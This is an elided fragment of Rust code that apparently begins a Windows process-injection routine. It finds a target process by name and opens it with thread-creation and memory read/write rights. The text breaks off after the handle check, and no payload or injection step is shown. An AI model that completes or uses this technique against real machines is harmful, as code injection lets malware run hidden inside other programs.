...
use std::ptr;
use sysinfo::{ProcessExt,SystemExt,AsU32};
use std::mem;
...
pub fn main() {
	...
	let _pe32 : PROCESSENTRY32 = PROCESSENTRY32 {
    ...
    for p in system.process_by_name(processname) {
        pidinject = p.pid().as_u32(); 
    }

	if pidinject != 0 {

		let hprocess = unsafe { OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 0, pidinject.try_into().unwrap()) };
		if hprocess != NULL {
